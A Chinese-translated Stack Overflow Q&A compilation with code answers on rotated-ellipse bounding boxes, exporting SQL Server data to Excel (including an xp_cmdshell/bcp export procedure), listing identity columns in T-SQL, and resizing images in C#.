num vy = ellipse.r2 * sin(ellipse.phi+PI/2);

num bbox_halfwidth = sqrt(ux*ux + vx*vx);
num bbox_halfheight = sqrt(uy*uy + vy*vy); 

Point bbox_ul_corner = new Point(ellipse.center.x - bbox_halfwidth, 
                                 ellipse.center.y - bbox_halfheight);

Point bbox_br_corner = new Point(ellipse.center.x + bbox_halfwidth, 
                                 ellipse.center.y + bbox_halfheight); 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-09-17T22:29:34.043

这相对简单但有点难以解释，因为您没有向我们提供您表示椭圆的方式。有很多方法可以做到..

无论如何，一般原则是这样的：您不能直接计算轴对齐的边界框。但是，您可以将 x 和 y 中的椭圆的极值计算为 2D 空间中的点。

为此，采用方程 x(t) = ellipse_equation(t) 和 y(t) = ellipse_equation(t) 就足够了。得到它的一阶导数并求解它的根。因为我们正在处理基于三角函数的椭圆，所以很简单。您最终应该得到一个通过 atan、acos 或 asin 求根的方程。

提示：要检查您的代码，请尝试使用未旋转的椭圆：您应该在 0、Pi/2、Pi 和 3*Pi/2 处获得根。

对每个轴（x 和 y）执行此操作。您最多将获得四个根（如果您的椭圆退化，则更少，例如半径之一为零）。评估根部的位置，你会得到椭圆的所有极值点。

现在你快到了。获取椭圆的边界框就像扫描这四个点的 xmin、xmax、ymin 和 ymax 一样简单。

顺便说一句 - 如果您在找到椭圆方程时遇到问题：尝试将其简化为您有一个轴对齐的椭圆，该椭圆有一个中心、两个半径和一个围绕中心的旋转角。

如果你这样做，方程变为：

```
 // the ellipse unrotated:
  temp_x(t) = radius.x * cos(t);
  temp_y(t) = radius.y * sin(t);

  // the ellipse with rotation applied:
  x(t) = temp_x(t) * cos(angle) - temp_y(t) * sin(angle) + center.x;
  y(t) = temp_x(t) * sin(angle) + temp_y(t) * cos(angle) + center.y; 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-05-22T20:12:17.417

布里利安·约翰·尼尔森。我已将您的代码转录为 c# - ellipseAngle 现在以度为单位：

```
private static RectangleF EllipseBoundingBox(int ellipseCenterX, int ellipseCenterY, int ellipseRadiusX, int ellipseRadiusY, double ellipseAngle)
{
    double angle = ellipseAngle * Math.PI / 180;
    double a = ellipseRadiusX * Math.Cos(angle);
    double b = ellipseRadiusY * Math.Sin(angle);
    double c = ellipseRadiusX * Math.Sin(angle);
    double d = ellipseRadiusY * Math.Cos(angle);
    double width = Math.Sqrt(Math.Pow(a, 2) + Math.Pow(b, 2)) * 2;
    double height = Math.Sqrt(Math.Pow(c, 2) + Math.Pow(d, 2)) * 2;
    var x= ellipseCenterX - width * 0.5;
    var y= ellipseCenterY + height * 0.5;
    return new Rectangle((int)x, (int)y, (int)width, (int)height);
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-09-17T21:41:07.903

我认为最有用的公式是这个。从原点角度 phi 旋转的省略号具有如下等式：

![替代文字](https://upload.wikimedia.org/math/0/3/c/03c5881fa31396b50318778bb607ebf9.png)

![替代文字](https://upload.wikimedia.org/math/0/c/0/0c06c7767e37335e07a0ba821d390180.png)

其中 (h,k) 是中心，a 和 b 是长轴和短轴的大小，t 从 -pi 到 pi 变化。

由此，您应该能够推导出 t dx/dt 或 dy/dt 变为 0。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-04-02T12:19:50.490

这是椭圆由其**焦点和偏心率**给出的情况的公式（对于由轴长度、中心和角度给出的情况，请参见例如 user1789690 的答案）。

即若焦点为(x0,y0)和(x1,y1)，偏心率为e，则

```
bbox_halfwidth  = sqrt(k2*dx2 + (k2-1)*dy2)/2
bbox_halfheight = sqrt((k2-1)*dx2 + k2*dy2)/2 
```

在哪里

```
dx = x1-x0
dy = y1-y0
dx2 = dx*dx
dy2 = dy*dy
k2 = 1.0/(e*e) 
```

我从 user1789690 和 Johan Nilsson 的答案中推导出公式。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-07-03T13:56:27.003

如果您使用 OpenCV/C++ 并使用`cv::fitEllipse(..)`函数，则可能需要椭圆的边界矩形。在这里，我使用迈克的回答提出了一个解决方案：

```
// tau = 2 * pi, see tau manifest
const double TAU = 2 * std::acos(-1);

cv::Rect calcEllipseBoundingBox(const cv::RotatedRect &anEllipse)
{
    if (std::fmod(std::abs(anEllipse.angle), 90.0) <= 0.01) {
        return anEllipse.boundingRect();
    }

    double phi   = anEllipse.angle * TAU / 360;
    double major = anEllipse.size.width  / 2.0;
    double minor = anEllipse.size.height / 2.0;

    if (minor > major) {
        std::swap(minor, major);
        phi += TAU / 4;
    }

    double cosPhi = std::cos(phi), sinPhi = std::sin(phi);
    double tanPhi = sinPhi / cosPhi;

    double tx = std::atan(-minor * tanPhi / major);
    cv::Vec2d eqx{ major * cosPhi, - minor * sinPhi };
    double x1 = eqx.dot({ std::cos(tx),           std::sin(tx)           });
    double x2 = eqx.dot({ std::cos(tx + TAU / 2), std::sin(tx + TAU / 2) });

    double ty = std::atan(minor / (major * tanPhi));
    cv::Vec2d eqy{ major * sinPhi, minor * cosPhi };
    double y1 = eqy.dot({ std::cos(ty),           std::sin(ty)           });
    double y2 = eqy.dot({ std::cos(ty + TAU / 2), std::sin(ty + TAU / 2) });

    cv::Rect_<float> bb{
        cv::Point2f(std::min(x1, x2), std::min(y1, y2)),
        cv::Point2f(std::max(x1, x2), std::max(y1, y2))
    };

    return bb + anEllipse.center;
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2021-05-22T21:07:48.170

这是基于上述答案的打字稿功能。

```
export function getRotatedEllipseBounds(
  x: number,
  y: number,
  rx: number,
  ry: number,
  rotation: number
) {
  const c = Math.cos(rotation)
  const s = Math.sin(rotation)
  const w = Math.hypot(rx * c, ry * s)
  const h = Math.hypot(rx * s, ry * c)

  return {
    minX: x + rx - w,
    minY: y + ry - h,
    maxX: x + rx + w,
    maxY: y + ry + h,
    width: w * 2,
    height: h * 2,
  }
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-07-30T19:19:52.043

此代码基于上面贡献的代码 user1789690，但在 Delphi 中实现。我已经对此进行了测试，据我所知，它运行良好。我花了一整天的时间寻找一个算法或一些代码，测试了一些不起作用的，我很高兴终于找到了上面的代码。我希望有人觉得这很有用。此代码将计算旋转椭圆的边界框。边界框是轴对齐的，不随椭圆旋转。半径是旋转之前的椭圆。

```
type

  TSingleRect = record
    X:      Single;
    Y:      Single;
    Width:  Single;
    Height: Single;
  end;

function GetBoundingBoxForRotatedEllipse(EllipseCenterX, EllipseCenterY, EllipseRadiusX,  EllipseRadiusY, EllipseAngle: Single): TSingleRect;
var
  a: Single;
  b: Single;
  c: Single;
  d: Single;
begin
  a := EllipseRadiusX * Cos(EllipseAngle);
  b := EllipseRadiusY * Sin(EllipseAngle);
  c := EllipseRadiusX * Sin(EllipseAngle);
  d := EllipseRadiusY * Cos(EllipseAngle);
  Result.Width  := Hypot(a, b) * 2;
  Result.Height := Hypot(c, d) * 2;
  Result.X      := EllipseCenterX - Result.Width * 0.5;
  Result.Y      := EllipseCenterY - Result.Height * 0.5;
end; 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2016-02-20T07:07:02.877

这是我找到紧密适合的矩形以任意方向椭圆的功能

我有opencv rect和实现点：

cg - 椭圆的中心

size - 椭圆的长轴、短轴

角度 - 椭圆的方向

```
cv::Rect ellipse_bounding_box(const cv::Point2f &cg, const cv::Size2f &size, const float angle) {

    float a = size.width / 2;
    float b = size.height / 2;
    cv::Point pts[4];

    float phi = angle * (CV_PI / 180);
    float tan_angle = tan(phi);
    float t = atan((-b*tan_angle) / a);
    float x = cg.x + a*cos(t)*cos(phi) - b*sin(t)*sin(phi);
    float y = cg.y + b*sin(t)*cos(phi) + a*cos(t)*sin(phi);
    pts[0] = cv::Point(cvRound(x), cvRound(y));

    t = atan((b*(1 / tan(phi))) / a);
    x = cg.x + a*cos(t)*cos(phi) - b*sin(t)*sin(phi);
    y = cg.y + b*sin(t)*cos(phi) + a*cos(t)*sin(phi);
    pts[1] = cv::Point(cvRound(x), cvRound(y));

    phi += CV_PI;
    tan_angle = tan(phi);
    t = atan((-b*tan_angle) / a);
    x = cg.x + a*cos(t)*cos(phi) - b*sin(t)*sin(phi);
    y = cg.y + b*sin(t)*cos(phi) + a*cos(t)*sin(phi);
    pts[2] = cv::Point(cvRound(x), cvRound(y));

    t = atan((b*(1 / tan(phi))) / a);
    x = cg.x + a*cos(t)*cos(phi) - b*sin(t)*sin(phi);
    y = cg.y + b*sin(t)*cos(phi) + a*cos(t)*sin(phi);
    pts[3] = cv::Point(cvRound(x), cvRound(y));

    long left = 0xfffffff, top = 0xfffffff, right = 0, bottom = 0;
    for (int i = 0; i < 4; i++) {
        left = left < pts[i].x ? left : pts[i].x;
        top = top < pts[i].y ? top : pts[i].y;
        right = right > pts[i].x ? right : pts[i].x;
        bottom = bottom > pts[i].y ? bottom : pts[i].y;
    }
    cv::Rect fit_rect(left, top, (right - left) + 1, (bottom - top) + 1);
    return fit_rect;
} 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2021-04-07T12:24:19.017

这是 javascript 中围绕旋转椭圆的边界框的简单示例： [https ://jsfiddle.net/rkn61mjL/1/](https://jsfiddle.net/rkn61mjL/1/)

这个想法非常简单，不需要复杂的计算和求解梯度：

1.  计算一个简单的非旋转椭圆边界框：

    ```
    let p1 = [centerX - radiusX, centerY - radiusY];
    let p2 = [centerX + radiusX, centerY - radiusY];
    let p3 = [centerX + radiusX, centerY + radiusY];
    let p4 = [centerX - radiusX, centerY + radiusY]; 
    ```

2.  围绕椭圆中心旋转所有四个点：

    ```
    p1 = [(p1[0]-centerX) * Math.cos(radians) - (p1[1]-centerY) *  Math.sin(radians) + centerX,
        (p1[0]-centerX) * Math.sin(radians) + (p1[1]-centerY) * Math.cos(radians) + centerY];        
    p2 = [(p2[0]-centerX) * Math.cos(radians) - (p2[1]-centerY) *  Math.sin(radians) + centerX,
        (p2[0]-centerX) * Math.sin(radians) + (p2[1]-centerY) * Math.cos(radians) + centerY];        
    p3 = [(p3[0]-centerX) * Math.cos(radians) - (p3[1]-centerY) *  Math.sin(radians) + centerX,
        (p3[0]-centerX) * Math.sin(radians) + (p3[1]-centerY) * Math.cos(radians) + centerY];        
    p4 = [(p4[0]-centerX) * Math.cos(radians) - (p4[1]-centerY) *  Math.sin(radians) + centerX,
        (p4[0]-centerX) * Math.sin(radians) + (p4[1]-centerY) * Math.cos(radians) + centerY]; 
    ```

# sql - 如何将 SQL Server 2005 数据传输或导出到 Excel

> ID：87735
> 
> 赞同：47
> 
> 时间：2008-09-17T21:14:24.083
> 
> 标签：sql, sql-server

我有一个简单的 SQL“选择”查询，我想将结果转储到 Excel 文件中。我只能保存为 .csv 并转换为 .xls 会产生一些超级难看的输出。无论如何，据我所知（使用谷歌），这似乎并不那么简单。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2008-09-17T21:17:59.537

SSIS 做这样的事情是不费吹灰之力的，而且非常直截了当（这正是它的用途）。

1.  在 SQL Management Studio 中右键单击数据库
2.  转到任务然后导出数据，然后您将看到一个易于使用的向导。
3.  您的数据库将是源，您可以输入您的 SQL 查询
4.  选择 Excel 作为目标
5.  在向导结束时运行它

如果您愿意，您也可以保存 SSIS 包（向导末尾有一个选项），以便您可以按计划或其他方式执行此操作（甚至在需要时打开并修改以添加更多功能）。

* * *

## 回答 #2

> 赞同：41
> 
> 时间：2008-09-17T21:16:38.570

使用 Excel 中的“外部数据”。它可以使用 ODBC 连接从外部源获取数据：数据/获取外部数据/新数据库查询

这样，即使数据库中的数据发生变化，也可以轻松刷新。

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2010-11-20T13:44:26.003

我找到了一种将查询结果从 SQL Server Management Studio 2005 导出到 Excel 的简单方法。

1) 选择菜单项查询 -> 查询选项。

**2)在复制或保存结果时在结果 -> 网格 -> 包括列标题**中设置复选框。

之后，当您选择全部并复制查询结果时，您可以将它们粘贴到 Excel 中，并且会出现列标题。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2012-02-27T16:43:19.230

[看到这个](https://stackoverflow.com/questions/9086880/t-sql-export-to-new-excel-file/9086889#9086889)

* * *

这是迄今为止从 SQL 导出到 excel 的最佳帖子：

[http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=49926](http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=49926)

引用用户的话`madhivanan`，

除了使用 DTS 和导出向导，我们还可以使用此查询将数据从 SQL Server2000 导出到 Excel

创建一个名为 testing 的 Excel 文件，其标题与表列的标题相同，并使用这些查询

1 将数据从 SQL Server 表导出到现有的 EXCEL 文件

```
insert into OPENROWSET('Microsoft.Jet.OLEDB.4.0', 
    'Excel 8.0;Database=D:\testing.xls;', 
    'SELECT * FROM [SheetName$]') select * from SQLServerTable 
```

2 将数据从 Excel 导出到新的 SQL Server 表

```
select * 
into SQLServerTable FROM OPENROWSET('Microsoft.Jet.OLEDB.4.0', 
    'Excel 8.0;Database=D:\testing.xls;HDR=YES', 
    'SELECT * FROM [Sheet1$]') 
```

3 将数据从 Excel 导出到现有的 SQL Server 表

```
Insert into SQLServerTable Select * FROM OPENROWSET('Microsoft.Jet.OLEDB.4.0', 
    'Excel 8.0;Database=D:\testing.xls;HDR=YES', 
    'SELECT * FROM [SheetName$]') 
```

4 如果您不想提前创建 EXCEL 文件并想将数据导出到其中，请使用

```
EXEC sp_makewebtask 
    @outputfile = 'd:\testing.xls', 
    @query = 'Select * from Database_name..SQLServerTable', 
    @colheaders =1, 
    @FixedFont=0,@lastupdated=0,@resultstitle='Testing details' 
```

（现在您可以找到包含表格格式数据的文件）

5 要将数据导出到带有标题（列名）的新 EXCEL 文件，请创建以下过程

```
create procedure proc_generate_excel_with_columns
(
    @db_name    varchar(100),
    @table_name varchar(100),   
    @file_name  varchar(100)
)
as

--Generate column names as a recordset
declare @columns varchar(8000), @sql varchar(8000), @data_file varchar(100)
select 
    @columns=coalesce(@columns+',','')+column_name+' as '+column_name 
from 
    information_schema.columns
where 
    table_name=@table_name
select @columns=''''''+replace(replace(@columns,' as ',''''' as '),',',',''''')

--Create a dummy file to have actual data
select @data_file=substring(@file_name,1,len(@file_name)-charindex('\',reverse(@file_name)))+'\data_file.xls'

--Generate column names in the passed EXCEL file
set @sql='exec master..xp_cmdshell ''bcp " select * from (select '+@columns+') as t" queryout "'+@file_name+'" -c'''
exec(@sql)

--Generate data in the dummy file
set @sql='exec master..xp_cmdshell ''bcp "select * from '+@db_name+'..'+@table_name+'" queryout "'+@data_file+'" -c'''
exec(@sql)

--Copy dummy file to passed EXCEL file
set @sql= 'exec master..xp_cmdshell ''type '+@data_file+' >> "'+@file_name+'"'''
exec(@sql)

--Delete dummy file 
set @sql= 'exec master..xp_cmdshell ''del '+@data_file+''''
exec(@sql) 
```

创建过程后，通过提供数据库名称、表名称和文件路径来执行它：

```
EXEC proc_generate_excel_with_columns 'your dbname', 'your table name','your file path' 
```

它长达 29 页，但那是因为其他人展示了各种其他方式以及人们提出的问题，就像这个关于如何做到这一点的问题。

完全按照该线程并查看人们提出的各种问题以及如何解决这些问题。我只是略读一下就获得了相当多的知识，并使用其中的一部分来获得预期的结果。

**更新单个单元格**

那里的成员彼得·拉森（Peter Larson）发布了以下内容：我认为这里缺少一件事。能够导出和导入 Excel 文件真是太好了，但是更新单个单元格怎么样？还是一系列细胞？

这是您如何管理的原则

```
update OPENROWSET('Microsoft.Jet.OLEDB.4.0', 
'Excel 8.0;Database=c:\test.xls;hdr=no', 
'SELECT * FROM [Sheet1$b7:b7]') set f1 = -99 
```

您还可以使用以下方法将公式添加到 Excel：

```
update OPENROWSET('Microsoft.Jet.OLEDB.4.0', 
'Excel 8.0;Database=c:\test.xls;hdr=no', 
'SELECT * FROM [Sheet1$b7:b7]') set f1 = '=a7+c7' 
```

**使用 T-SQL 导出列名**

成员 Mladen Prajdic 也有一篇关于如何在[此处执行此操作的博客条目](http://weblogs.sqlteam.com/mladenp/archive/2006/07/25/10771.aspx)

参考：[www.sqlteam.com](http://www.sqlteam.com)（顺便说一句，对于希望从 SQL Server 获得更多信息的人来说，这是一个极好的博客/论坛）。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2008-09-17T21:21:30.603

如果您正在寻找临时项目而不是您将放入 SSIS 的东西。从 SSMS 中只需突出显示结果网格，复制，然后粘贴到 excel 中，它并不优雅，但可以工作。然后您可以保存为本机 .xls 而不是 .csv

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2008-09-17T22:07:36.437

这是一个视频，将逐步向您展示如何将数据导出到 Excel。对于需要导出到 Excel 的“一次性”问题，这是一个很好的解决方案：
[即席报告](http://www.sqlservervideos.com/tips-n-tricks/adhoc-reporting)

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2010-12-15T21:51:16.093

在 Excel 中进行操作要容易得多。！！打开 Excel 数据>导入/导出数据>导入数据 在文件名旁边单击“新源”按钮 在欢迎使用数据连接向导时，选择 Microsoft SQL Server。点击下一步。输入服务器名称和凭据。从下拉列表中，选择包含您需要的表的数据库。选择您的表然后下一步.....如果您愿意，请输入描述并单击完成。完成并返回 Excel 后，只需单击“确定”即可。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2011-07-15T09:05:58.527

创建 excel 数据源并插入值，

```
insert into OPENROWSET('Microsoft.Jet.OLEDB.4.0', 
'Excel 8.0;Database=D:\testing.xls;', 
'SELECT * FROM [SheetName$]') select * from SQLServerTable 
```

更多信息可在此处获得 [http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=49926](http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=49926)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-09-18T12:24:44.567

您始终可以使用 ADO 将结果从记录集对象写入工作表单元格

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2011-07-18T17:19:51.837

一个方便的工具[将 SQL](http://sqlmgmt.com/ProductDetail.aspx?Id=108)转换为 Excel，无需编程即可将 SQL 表或 SQL 查询结果转换为 Excel 文件。

主要功能 - 将 SQL 表转换/导出到 Excel 文件 - 将多个表（多个查询结果）转换/导出到多个 Excel 工作表。- 允许灵活的 TSQL 查询，它可以有多个 SELECT 语句或其他复杂的查询语句。

B. 问候，亚历克斯

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2011-10-08T14:44:21.330

有几种工具可以从 SQL Server 导出/导入到 Excel。

谷歌是你的朋友 :-)

我们在这里使用 DbTransfer（它也是可以将完整数据库导出到 Excel 文件的一种）：[http](http://www.dbtransfer.de/Products/DbTransfer) ://www.dbtransfer.de/Products/DbTransfer 。

我们之前使用过sql server的openrowset功能，但我一直不满意，因为它不是很容易使用并且缺乏功能和速度......

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2013-03-19T11:00:26.500

试试“导入和导出数据（32 位）”工具。安装 MS SQL Management Studio Express 2012 后可用。

使用此工具，选择数据库、表或插入您自己的 SQL 查询并选择目标（例如 MS Excel 文件）非常容易。

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2013-03-14T10:54:10.003

您可以右键单击 SQL Server 中的结果网格，然后选择另存为 CSV。你可以然后你可以将它导入Excel。

Excel 为您提供导入向导，确保您选择逗号分隔。当我需要将 50k+ 记录导入 excel 时，它对我来说很好。

* * *

## 回答 #14

> 赞同：-1
> 
> 时间：2015-05-07T13:46:01.633

检查这个。

```
Query -> Query Options.

Results -> Grid -> Include column headers when copying or saving the results 
```

# sql-server - 如何以编程方式确定哪些 SQL 表具有标识列

> ID：87747
> 
> 赞同：107
> 
> 时间：2008-09-17T21:15:36.763
> 
> 标签：sql-server, tsql, metadata, identity-column

我想在 SQL Server 2005 中创建一个列列表，这些列在 T-SQL 中具有标识列及其对应的表。

结果将类似于：

表名、列名

* * *

## 回答 #1

> 赞同：179
> 
> 时间：2008-09-17T21:44:11.173

对于 SQL Server 执行此操作的另一种可能方法是使用 INFORMATION_SCHEMA 视图：

```
select COLUMN_NAME, TABLE_NAME
from INFORMATION_SCHEMA.COLUMNS
where COLUMNPROPERTY(object_id(TABLE_SCHEMA+'.'+TABLE_NAME), COLUMN_NAME, 'IsIdentity') = 1
order by TABLE_NAME 
```

* * *

## 回答 #2

> 赞同：53
> 
> 时间：2008-09-17T21:18:03.577

sys.columns.is_identity = 1

例如，

```
select o.name, c.name
from sys.objects o inner join sys.columns c on o.object_id = c.object_id
where c.is_identity = 1 
```

* * *

## 回答 #3

> 赞同：28
> 
> 时间：2008-09-17T21:43:12.953

另一种方式（2000 / 2005/2012/2014）：

```
IF ((SELECT OBJECTPROPERTY( OBJECT_ID(N'table_name_here'), 'TableHasIdentity')) = 1)
    PRINT 'Yes'
ELSE
    PRINT 'No' 
```

注意：`table_name_here`应该是`schema.table`，除非架构是`dbo`.

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-09-17T21:18:39.813

在 SQL 2005 中：

```
select object_name(object_id), name
from sys.columns
where is_identity = 1 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-09-17T21:27:28.157

这个查询似乎可以解决问题：

```
SELECT 
    sys.objects.name AS table_name, 
    sys.columns.name AS column_name
FROM sys.columns JOIN sys.objects 
    ON sys.columns.object_id=sys.objects.object_id
WHERE 
    sys.columns.is_identity=1
    AND
    sys.objects.type in (N'U') 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2015-01-08T18:26:24.807

基于[Guillermo](https://stackoverflow.com/a/87983/320427)答案的没有标识列的表列表：

```
SELECT DISTINCT TABLE_NAME
FROM            INFORMATION_SCHEMA.COLUMNS
WHERE        (TABLE_SCHEMA = 'dbo') AND (OBJECTPROPERTY(OBJECT_ID(TABLE_NAME), 'TableHasIdentity') = 0)
ORDER BY TABLE_NAME 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2011-02-17T09:27:10.167

这是 MSSQL 2000 的工作版本。我修改了此处找到的 2005 代码：http: [//sqlfool.com/2011/01/identity-columns-are-you-nearing-the-limits/](http://sqlfool.com/2011/01/identity-columns-are-you-nearing-the-limits/)

```
/* Define how close we are to the value limit
   before we start throwing up the red flag.
   The higher the value, the closer to the limit. */
DECLARE @threshold DECIMAL(3,2);
SET @threshold = .85;

/* Create a temp table */
CREATE TABLE #identityStatus
(
      database_name     VARCHAR(128)
    , table_name        VARCHAR(128)
    , column_name       VARCHAR(128)
    , data_type         VARCHAR(128)
    , last_value        BIGINT
    , max_value         BIGINT
);

DECLARE @dbname sysname;
DECLARE @sql nvarchar(4000);

-- Use an cursor to iterate through the databases since in 2000 there's no sp_MSForEachDB command...

DECLARE c cursor FAST_FORWARD FOR
SELECT
    name
FROM
    master.dbo.sysdatabases 
WHERE 
    name NOT IN('master', 'model', 'msdb', 'tempdb');

OPEN c;

FETCH NEXT FROM c INTO @dbname;

WHILE @@FETCH_STATUS = 0
BEGIN
    SET @sql = N'Use [' + @dbname + '];
    Insert Into #identityStatus
    Select ''' + @dbname + ''' As [database_name]
        , Object_Name(id.id) As [table_name]
        , id.name As [column_name]
        , t.name As [data_type]
        , IDENT_CURRENT(Object_Name(id.id)) As [last_value]
        , Case 
            When t.name = ''tinyint''   Then 255 
            When t.name = ''smallint''  Then 32767 
            When t.name = ''int''       Then 2147483647 
            When t.name = ''bigint''    Then 9223372036854775807
          End As [max_value]
    From 
        syscolumns As id
        Join systypes As t On id.xtype = t.xtype
    Where 
        id.colstat&1 = 1    -- this identifies the identity columns (as far as I know)
    ';

    EXECUTE sp_executesql @sql;

    FETCH NEXT FROM c INTO @dbname;
END

CLOSE c;
DEALLOCATE c;

/* Retrieve our results and format it all prettily */
SELECT database_name
    , table_name
    , column_name
    , data_type
    , last_value
    , CASE 
        WHEN last_value < 0 THEN 100
        ELSE (1 - CAST(last_value AS FLOAT(4)) / max_value) * 100 
      END AS [percentLeft]
    , CASE 
        WHEN CAST(last_value AS FLOAT(4)) / max_value >= @threshold
            THEN 'warning: approaching max limit'
        ELSE 'okay'
        END AS [id_status]
FROM #identityStatus
ORDER BY percentLeft;

/* Clean up after ourselves */
DROP TABLE #identityStatus; 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2018-07-12T16:19:39.630

以下查询对我有用：

```
select  TABLE_NAME tabla,COLUMN_NAME columna
from    INFORMATION_SCHEMA.COLUMNS
where   COLUMNPROPERTY(object_id(TABLE_SCHEMA+'.'+TABLE_NAME), COLUMN_NAME, 'IsIdentity') = 1
order by TABLE_NAME 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-09-17T21:22:06.170

我认为这适用于 SQL 2000：

```
SELECT 
    CASE WHEN C.autoval IS NOT NULL THEN
        'Identity'
    ELSE
        'Not Identity'
    AND
FROM
    sysobjects O
INNER JOIN
    syscolumns C
ON
    O.id = C.id
WHERE
    O.NAME = @TableName
AND
    C.NAME = @ColumnName 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2013-08-30T12:58:31.513

这对我使用 Sql Server 2008 有效：

```
USE <database_name>;
GO
SELECT SCHEMA_NAME(schema_id) AS schema_name
    , t.name AS table_name
    , c.name AS column_name
FROM sys.tables AS t
JOIN sys.identity_columns c ON t.object_id = c.object_id
ORDER BY schema_name, table_name;
GO 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2013-09-06T13:17:16.427

用这个 ：

```
DECLARE @Table_Name VARCHAR(100) 
DECLARE @Column_Name VARCHAR(100)
SET @Table_Name = ''
SET @Column_Name = ''

SELECT  RowNumber = ROW_NUMBER() OVER ( PARTITION BY T.[Name] ORDER BY T.[Name], C.column_id ) ,
    SCHEMA_NAME(T.schema_id) AS SchemaName ,
    T.[Name] AS Table_Name ,
    C.[Name] AS Field_Name ,
    sysType.name ,
    C.max_length ,
    C.is_nullable ,
    C.is_identity ,
    C.scale ,
    C.precision
FROM    Sys.Tables AS T
    LEFT JOIN Sys.Columns AS C ON ( T.[Object_Id] = C.[Object_Id] )
    LEFT JOIN sys.types AS sysType ON ( C.user_type_id = sysType.user_type_id )
WHERE   ( Type = 'U' )
    AND ( C.Name LIKE '%' + @Column_Name + '%' )
    AND ( T.Name LIKE '%' + @Table_Name + '%' )
ORDER BY T.[Name] ,
    C.column_id 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2016-10-18T19:00:07.867

这适用于 SQL Server 2005、2008 和 2012。我发现 sys.identity_columns 不包含我所有带有标识列的表。

```
SELECT a.name AS TableName, b.name AS IdentityColumn
FROM sys.sysobjects a 
JOIN sys.syscolumns b 
ON a.id = b.id
WHERE is_identity = 1
ORDER BY name; 
```

查看文档页面，也可以使用状态列。您还可以添加四部分标识符，它将在不同的服务器上工作。

```
SELECT a.name AS TableName, b.name AS IdentityColumn
FROM [YOUR_SERVER_NAME].[YOUR_DB_NAME].sys.sysobjects a 
JOIN [YOUR_SERVER_NAME].[YOUR_DB_NAME].sys.syscolumns b 
ON a.id = b.id
WHERE is_identity = 1
ORDER BY name; 
```

来源： [https ://msdn.microsoft.com/en-us/library/ms186816.aspx](https://msdn.microsoft.com/en-us/library/ms186816.aspx)

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2018-07-12T17:38:45.743

由于某种原因，sql server 在不同的表中保存了一些标识列，对我有用的代码如下：

```
select      TABLE_NAME tabla,COLUMN_NAME columna
from        INFORMATION_SCHEMA.COLUMNS
where       COLUMNPROPERTY(object_id(TABLE_SCHEMA+'.'+TABLE_NAME), COLUMN_NAME, 'IsIdentity') = 1
union all
select      o.name tabla, c.name columna
from        sys.objects o 
inner join  sys.columns c on o.object_id = c.object_id
where       c.is_identity = 1 
```

# c# - 在不损失任何质量的情况下调整图像大小

> ID：87753
> 
> 赞同：113
> 
> 时间：2008-09-17T21:16:08.743
> 
> 标签：c#, image, image-scaling

如何在不影响图像质量的情况下调整图像大小？

* * *

## 回答 #1

> 赞同：221
> 
> 时间：2008-09-17T21:20:27.360

正如[rcar](https://stackoverflow.com/questions/87753/resizing-an-image-without-losing-any-quality#87763)所说，你不能不损失一些质量，你可以在 c# 中做的最好的事情是：

```
Bitmap newImage = new Bitmap(newWidth, newHeight);
using (Graphics gr = Graphics.FromImage(newImage))
{
    gr.SmoothingMode = SmoothingMode.HighQuality;
    gr.InterpolationMode = InterpolationMode.HighQualityBicubic;
    gr.PixelOffsetMode = PixelOffsetMode.HighQuality;
    gr.DrawImage(srcImage, new Rectangle(0, 0, newWidth, newHeight));
} 
```

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2008-09-17T21:17:17.057

除非您正在制作矢量图形，否则无法在不损失一些图像质量的情况下调整图像大小。

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2012-05-24T09:54:21.257

```
private static Image resizeImage(Image imgToResize, Size size)
{
    int sourceWidth = imgToResize.Width;
    int sourceHeight = imgToResize.Height;

    float nPercent = 0;
    float nPercentW = 0;
    float nPercentH = 0;

    nPercentW = ((float)size.Width / (float)sourceWidth);
    nPercentH = ((float)size.Height / (float)sourceHeight);

    if (nPercentH < nPercentW)
        nPercent = nPercentH;
    else
        nPercent = nPercentW;

    int destWidth = (int)(sourceWidth * nPercent);
    int destHeight = (int)(sourceHeight * nPercent);

    Bitmap b = new Bitmap(destWidth, destHeight);
    Graphics g = Graphics.FromImage((Image)b);
    g.InterpolationMode = InterpolationMode.HighQualityBicubic;

    g.DrawImage(imgToResize, 0, 0, destWidth, destHeight);
    g.Dispose();

    return (Image)b;
} 
```

## 从[这里](http://www.switchonthecode.com/tutorials/csharp-tutorial-image-editing-saving-cropping-and-resizing)

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-01-06T10:50:14.043

我相信您要做的是“调整大小/重新采样”您的图像。这是一个提供说明并提供实用程序类的好网站（我也碰巧使用）：

